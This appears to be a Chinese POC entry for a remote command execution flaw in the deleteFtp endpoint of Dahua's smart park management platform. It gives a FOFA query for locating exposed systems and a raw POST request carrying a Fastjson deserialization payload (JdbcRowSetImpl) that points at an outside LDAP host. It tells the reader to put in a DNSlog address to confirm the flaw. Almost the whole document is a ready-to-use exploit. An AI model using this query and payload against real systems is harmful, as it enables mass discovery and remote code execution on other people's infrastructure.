## 大华智慧园区综合管理平台 deleteFtp 远程命令执行漏洞

## fofa
```
body="src=/WPMS/asset/common/js/jsencrypt.min.js"
```

## poc
```
POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1
Host: Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9Cookie: yourCookieConnection: close
Content-Type: application/json
Content-Length: 189

{"ftpUrl":{"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.x.x.x","autoCommit":true}}}
```

`ldap://x.x.x.x` 填入dnslog地址 ，发送poc dnslog有请求说明存在漏洞
